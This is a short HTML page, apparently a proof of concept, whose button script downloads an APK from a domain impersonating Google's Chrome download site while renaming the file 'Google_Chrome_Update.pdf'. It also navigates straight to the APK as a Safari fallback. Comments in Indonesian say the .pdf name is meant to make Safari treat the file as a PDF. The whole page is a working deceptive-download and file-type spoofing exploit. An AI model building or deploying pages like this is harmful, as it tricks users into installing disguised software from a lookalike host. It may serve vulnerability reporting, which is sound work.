<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
.button {
  background-color: #4CAF50;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
</style>
</head>
<body>
<script>
function a(){
	var link = document.createElement('a');
	link.href = 'http://chrome-downloads.google.communication.unaux.com/POC.apk';
	
	// Ganti ekstensi jadi .pdf agar Safari mengenali sebagai PDF
	link.download = 'Google_Chrome_Update.pdf';
	
	document.body.appendChild(link);
	link.click();
	document.body.removeChild(link);

	// Fallback untuk Safari: buka langsung di tab baru sebagai navigasi user-initiated
	setTimeout(function(){
		window.location.href = link.href;
	}, 100);
}
</script>
<center><input type="button" class="button" value="Download POC PDF" onclick="a()"></center>
</body>
</html>
